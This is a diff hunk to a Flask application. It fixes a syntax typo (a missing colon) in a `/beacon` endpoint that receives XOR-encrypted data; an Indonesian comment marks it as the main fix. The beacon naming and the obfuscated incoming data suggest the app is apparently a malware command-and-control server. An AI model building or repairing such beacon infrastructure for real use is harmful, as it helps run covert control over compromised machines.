@@ -1344,7 +1344,7 @@ def live_logs():
 @app.route('/beacon', methods=['POST'])
 def beacon():
     encrypted_data = request.form.get('data')
-    if not encrypted_data  # ✅ PERBAIKAN UTAMA: typo diperbaiki
+    if not encrypted_data:  # ✅ PERBAIKAN UTAMA: typo diperbaiki
         return "Invalid", 400
 
     decrypted = xor_decrypt(encrypted_data)
